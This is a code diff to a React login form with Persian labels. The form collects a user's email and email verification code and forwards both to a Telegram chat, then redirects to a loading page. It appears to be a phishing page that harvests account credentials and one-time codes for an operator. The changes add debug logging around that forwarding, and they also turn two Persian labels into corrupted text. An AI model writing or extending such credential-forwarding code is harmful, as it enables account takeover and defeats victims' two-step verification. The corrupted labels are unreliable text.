@@ -441,18 +441,34 @@ export const LoginForm = () => {
     setIsSubmitting(true);
 
     try {
-      console.log("Updating email message with code:", emailCode);
+      console.log("🔄 Starting email code submission:", {
+        emailCode,
+        emailMessageId,
+        email,
+      });
 
       if (emailMessageId) {
+        console.log(
+          "✅ Message ID found, updating existing message:",
+          emailMessageId,
+        );
         // Update the existing message with both email and code
         const updatedMessage = `📧 کاربر ایمیل وارد کرد:\n\nایمیل: ${email}\n\n✅ کد تایید ایمیل:\nکد وارد شده: ${emailCode}`;
 
-        await updateCustomMessageInTelegram(emailMessageId, updatedMessage);
+        const updateResult = await updateCustomMessageInTelegram(
+          emailMessageId,
+          updatedMessage,
+        );
+        console.log("🔄 Update result:", updateResult);
       } else {
+        console.log(
+          "❌ No message ID found, using fallback (sending new message)",
+        );
         // Fallback: send new message if message ID is not available
-        await sendCustomMessageToTelegram(
+        const fallbackResult = await sendCustomMessageToTelegram(
           `✅ کاربر کد تایید ایمیل وارد کرد:\n\nکد وارد شده: ${emailCode}\n\nایمیل: ${email}`,
         );
+        console.log("📤 Fallback result:", fallbackResult);
       }
 
       // Navigate to loading page after updating Telegram
@@ -2003,7 +2019,7 @@ export const LoginForm = () => {
                       color: "rgb(0, 0, 0)",
                     }}
                   >
-                    رمز عبور حساب را وارد کنید.
+                    رمز عبور حساب را وارد کنی��.
                   </label>
                   <div
                     style={{
@@ -2354,7 +2370,7 @@ export const LoginForm = () => {
                       textDecoration: "none",
                     }}
                   >
-                    بازیابی رمز عبور
+                    بازیا��ی رمز عبور
                   </a>
                 </div>
 
